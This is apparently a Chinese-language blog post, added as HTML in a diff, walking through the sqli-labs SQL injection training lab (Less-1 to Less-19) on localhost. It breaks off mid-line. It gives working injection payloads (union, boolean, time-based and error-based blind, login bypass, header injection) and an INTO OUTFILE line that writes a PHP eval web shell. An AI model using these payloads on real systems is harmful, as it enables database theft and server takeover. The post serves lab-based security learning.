@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>sqlilabs | Mkey的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="sqlilabs1234567891011121314151617181920212223# 常用系统函数1. version()——MySQL 版本2. user()——数据库用户名3. database()——数据库名4. @@datadir——数据库路径5. @@version_compile_os——操作系统版本# 字符串连接函数1. concat(str1,str2,...)——没有分隔">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlilabs">
+<meta property="og:url" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/index.html">
+<meta property="og:site_name" content="Mkey的博客">
+<meta property="og:description" content="sqlilabs1234567891011121314151617181920212223# 常用系统函数1. version()——MySQL 版本2. user()——数据库用户名3. database()——数据库名4. @@datadir——数据库路径5. @@version_compile_os——操作系统版本# 字符串连接函数1. concat(str1,str2,...)——没有分隔">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20210922110005139.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20210922110732132.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20210923093928827.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20211118101835878.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20211118102600687.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20211118153450695.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20211119144644508.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20211119152651946.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20211120181312523.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8A%E5%8D%8810.39.45.png">
+<meta property="article:published_time" content="2021-10-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-26T13:29:27.087Z">
+<meta property="article:author" content="HOU">
+<meta property="article:tag" content="web-security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20210922110005139.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Mkey的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Mkey的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://monkeyh0ck.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-sqlilabs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/01/sqlilabs/" class="article-date">
+  <time class="dt-published" datetime="2021-10-31T16:00:00.000Z" itemprop="datePublished">2021-11-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      sqlilabs
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="sqlilabs"><a href="#sqlilabs" class="headerlink" title="sqlilabs"></a>sqlilabs</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 常用系统函数</span><br><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br><span class="line"></span><br><span class="line"># 字符串连接函数</span><br><span class="line">1. concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br><span class="line"></span><br><span class="line"># information_schema</span><br><span class="line">Mysql 有一个系统数据库information_schema，存储着所有的数据库的相关信息，一般的，</span><br><span class="line">我们利用该表可以进行一次完整的注入。</span><br><span class="line"></span><br><span class="line">猜数据库</span><br><span class="line">select schema_name from information_schema.schemata</span><br><span class="line">猜某库的数据表</span><br><span class="line">select table_name from information_schema.tables where table_schema=’xxxxx’</span><br><span class="line">猜某表的所有列</span><br><span class="line">Select column_name from information_schema.columns where table_name=’xxxxx’</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqlilabs/Less-1/?id=1</span><br><span class="line">正常访问，首先判断注入类型，在1后添加‘测试发现报错</span><br><span class="line">near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line">可以发现1后面多了一个&#x27;，可以判断出注入类型为字符型，&#x27;&#x27;闭合。</span><br><span class="line"></span><br><span class="line">使用order by 判断 sql语句查询有3个对象</span><br><span class="line">使用联合查询：</span><br><span class="line">http://localhost/sqlilabs/Less-1/?id=-1%27%20union%20select%201,version(),user()%20--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/01/sqlilabs/image-20210922110005139.png" alt="image-20210922110005139"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 联合注入</span><br><span class="line">union 的作用是将两个sql 语句进行联合。Union 可以从</span><br><span class="line">下面的例子中可以看出，强调一点：union 前后的两个sql 语句的选择列数要相同才可以。</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;报错：</span><br><span class="line"> &#x27;&#x27; LIMIT 0,1&#x27; </span><br><span class="line">判断注入为数字型</span><br><span class="line"></span><br><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/01/sqlilabs/image-20210922110732132.png" alt="image-20210922110732132"></p>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;报错：</span><br><span class="line"> &#x27;&#x27;1&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">?id=1&#x27;) --+</span><br><span class="line">注入成功</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;不报错</span><br><span class="line">但?id=1&quot;报错：</span><br><span class="line"> &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br><span class="line"> </span><br><span class="line"> ?id=1&quot;)--+</span><br><span class="line"> 注入成功</span><br></pre></td></tr></table></figure>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注分类：</p>
+<ul>
+<li>布尔盲注</li>
+<li>时间盲注</li>
+<li>报错盲注</li>
+</ul>
+<p><strong>布尔盲注</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 截取字符串常用函数</span><br><span class="line">mid(),substr(),left()</span><br><span class="line"></span><br><span class="line">mid(column_name,start[,length])</span><br><span class="line">substring(string, start, length)</span><br><span class="line">substr(string, start, length)</span><br><span class="line">Left ( string, n )</span><br><span class="line"></span><br><span class="line"># regexp 正则注入</span><br><span class="line">select user() regexp &#x27;^[a-z]&#x27;;</span><br><span class="line"></span><br><span class="line"># like 匹配注入</span><br><span class="line">select user() like ‘ro%’</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>报错盲注</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</span><br><span class="line"></span><br><span class="line">此处有三个点，一是需要concat 计数，二是floor，取得0 or 1，进行数据的重复，三是group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。</span><br><span class="line"></span><br><span class="line">如果rand 被禁用了可以使用用户变量来报错</span><br><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</span><br><span class="line"></span><br><span class="line">select exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围</span><br><span class="line"></span><br><span class="line">select !(select * from (select user())x) -（ps:这是减号） ~0</span><br><span class="line">//bigint 超出范围；~0 是对0 逐位取反，很大的版本在5.5.5 及其以上</span><br><span class="line"></span><br><span class="line">extractvalue(1,concat(0x7e,(select @@version),0x7e)) </span><br><span class="line">//mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误</span><br><span class="line"></span><br><span class="line">updatexml(1,concat(0x7e,(select @@version),0x7e),1) </span><br><span class="line">//mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误</span><br><span class="line"></span><br><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br><span class="line">//mysql 重复特性，此处重复了version，所以报错。</span><br></pre></td></tr></table></figure>
+
+<p><strong>时间盲注</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 </span><br><span class="line">//if 判断语句，条件为假，执行sleep</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br><span class="line">&#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line"></span><br><span class="line">?id=1&#x27; --+</span><br><span class="line">注入成功一半，闭合成功，但是么有回显，不能显示有用信息</span><br><span class="line">使用盲注判断</span><br><span class="line"></span><br><span class="line">使用布尔盲注</span><br><span class="line">?id=1&#x27; and left(version(),1)=5 --+</span><br><span class="line">回显正常</span><br><span class="line">?id=1&#x27; and left(version(),1)=4 --+</span><br><span class="line">回显报错</span><br><span class="line"></span><br><span class="line">报错注入</span><br><span class="line">?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/01/sqlilabs/image-20210923093928827.png" alt="image-20210923093928827"></p>
+<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;</span><br><span class="line">&#x27;&quot;1&quot;&quot; LIMIT 0,1&#x27; at line 1</span><br><span class="line"></span><br><span class="line">?id=1&quot; --+</span><br><span class="line">回显正常</span><br><span class="line"></span><br><span class="line">?id=1&quot; and mid(version(),1,1)=5 --+</span><br><span class="line">注入成功</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="导入导出相关操作的讲解"><a href="#导入导出相关操作的讲解" class="headerlink" title="导入导出相关操作的讲解"></a>导入导出相关操作的讲解</h2><ol>
+<li>load_file()</li>
+<li>LOAD DATA INFILE</li>
+<li>SELECT…..INTO OUTFILE ‘file_name’</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">load_file()</span><br><span class="line">读取文件并返回该文件的内容做一个字符串</span><br><span class="line">使用条件：</span><br><span class="line">A、必须有权限读取并且文件必须完全可读</span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常,说明具有读写权限。</span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 返回错误，应该是管理员给数据库帐户降权</span><br><span class="line">B、欲读取文件必须在服务器上</span><br><span class="line">C、必须指定文件完整的路径</span><br><span class="line">D、欲读取文件必须小于max_allowed_packet</span><br><span class="line"></span><br><span class="line">难点：</span><br><span class="line">绝对物理路径</span><br><span class="line">构造有效的畸形语句（报错爆出绝对路径）</span><br><span class="line"></span><br><span class="line">LOAD DATA INFILE</span><br><span class="line">语句用于高速地从一个文本文件中读取行，并装入一个表中。</span><br><span class="line">例如：load data infile &quot;/data/mysql/e.sql&quot; into table e fields terminated by &#x27;,&#x27;;</span><br><span class="line"></span><br><span class="line">SELECT.....INTO OUTFILE &#x27;file_name&#x27;</span><br><span class="line">可以把被选择的行写入一个文件中。</span><br><span class="line">例如：Select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">测试发现</span><br><span class="line">?id=1&quot;</span><br><span class="line">回显正常</span><br><span class="line">?id=1&#x27;</span><br><span class="line">回显报错: You have an error in your SQL syntax</span><br><span class="line">判断属于字符型注入,闭合引号为&#x27;</span><br><span class="line">猜测)有多少个</span><br><span class="line">经测试有两个))</span><br><span class="line">?id=1&#x27;)) --+</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;)) union select version(),@@datadir,user() into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\a.txt&quot; --+</span><br><span class="line">成功在写入a.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=2 --+</span><br><span class="line">经测试发现注入点是字符型，单引号&#x27;</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and Left(database(),1)=&#x27;s&#x27;--+</span><br><span class="line">布尔盲注</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if(Left(database(),1)=&#x27;a&#x27;,1,sleep(5))--+</span><br><span class="line">时间盲注</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">由于无论输入&#x27;&quot;)都没有报错或者其他回显可以判断是否存在注入点</span><br><span class="line">则使用延时盲注</span><br><span class="line">?id=1 and sleep(5) --+</span><br><span class="line"></span><br><span class="line">经过判断，</span><br><span class="line">?id=1’ and sleep(5) --+</span><br><span class="line">注入时间有明显延时，故注入点存在，还是&#x27;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>同上</p>
+<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>开始post</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正常账户和密码都是admin</span><br><span class="line">需要绕过账户密码登录</span><br><span class="line"></span><br><span class="line">账户输入admin&#x27;#</span><br><span class="line">绕过成功</span><br><span class="line"></span><br><span class="line">Username：fdas&#x27;union select 1,database()#</span><br><span class="line">结果：</span><br><span class="line">Your Login name:1</span><br><span class="line">Your Password:security</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">经测试</span><br><span class="line">单独在user中测试admin、admin&#x27;直接回显登录失败</span><br><span class="line">测试admin&quot;则回显报错</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class="line">判断可能是有)</span><br><span class="line">经测试admin&quot;)#成功回显</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;#</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class="line"></span><br><span class="line">admin&#x27;)#</span><br><span class="line">回显成功</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;#</span><br><span class="line">回显成功</span><br><span class="line"></span><br><span class="line">uname=admin&quot;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd=1&amp;submit=Submit</span><br><span class="line">成功看到版本信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;#</span><br><span class="line">回显成功</span><br><span class="line"></span><br><span class="line">无法使用上一关的报错盲注，不会回显出来</span><br><span class="line">但是可以使用布尔盲注和延时盲注</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">经过测试</span><br><span class="line">uname=admin&quot;) #&amp;passwd=1&amp;submit=Submit</span><br><span class="line">回显登录成功</span><br><span class="line"></span><br><span class="line">uname=admin&quot;) and if(substr(version(),1,1)=&#x27;5&#x27;,1,sleep(5)) #&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">要求：[PASSWORD RESET] </span><br><span class="line"></span><br><span class="line">经过测试，username需要是真实name，且密码必须输入，可随机</span><br><span class="line"></span><br><span class="line">username:admin</span><br><span class="line">password:1&#x27;</span><br><span class="line">报错内容如下：</span><br><span class="line">&#x27;admin&#x27;&#x27; at line 1</span><br><span class="line">即password存在注入点</span><br><span class="line"></span><br><span class="line">使用报错注入</span><br><span class="line">uname=admin &amp;passwd=1&#x27;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;submit=Submit</span><br><span class="line">成功回显XPATH syntax error: &#x27;~5.5.53~&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="字符串转义相关函数介绍"><a href="#字符串转义相关函数介绍" class="headerlink" title="字符串转义相关函数介绍"></a>字符串转义相关函数介绍</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">addslashes() </span><br><span class="line">函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line">默认地，PHP 对所有的GET、POST 和COOKIE 数据自动运行addslashes()。</span><br><span class="line"></span><br><span class="line">stripslashes()</span><br><span class="line">函数删除由addslashes() 函数添加的反斜杠。</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string()</span><br><span class="line">函数转义SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line">转义以下字符：</span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">经过多方测试，发现输入</span><br><span class="line">username:admin</span><br><span class="line">password:1</span><br><span class="line">回显如下：</span><br><span class="line">Your IP ADDRESS is: 127.0.0.1</span><br><span class="line">Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line"></span><br><span class="line">由于username和password没法注入，则根据回显内容，尝试再user-agent注入</span><br><span class="line">通过抓包对user-agent:进行编辑，发现回显成功改变为编辑内容</span><br><span class="line">Your User Agent is: fuck</span><br><span class="line"></span><br><span class="line">user-agent: &#x27;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">注入成功，成功显示版本号</span><br><span class="line">XPATH syntax error: &#x27;~5.5.53~&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">经测试，输入</span><br><span class="line">post：uname=admin&amp;passwd=1&amp;submit=Submit</span><br><span class="line">referrer：http://127.0.0.1/sqlilabs/less-19/</span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">Your IP ADDRESS is: 127.0.0.1</span><br><span class="line">Your Referer is: http://127.0.0.1/sqlilabs/less-19/</span><br><span class="line"></span><br><span class="line">经测试当在referer参数后面添加&#x27;时会回显报错，输入&quot;则不会有报错</span><br><span class="line">初步判断是&#x27;闭合</span><br><span class="line">再输入&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">回显结果正常，无报错</span><br><span class="line"></span><br><span class="line">使用报错盲注</span><br><span class="line">&#x27; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">回显结果如下</span><br><span class="line">Your IP ADDRESS is: 127.0.0.1</span><br><span class="line">Your Referer is: &#x27; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">XPATH syntax error: &#x27;~D:/phpStudy/PHPTutorial/MySQL/~&#x27;</span><br><span 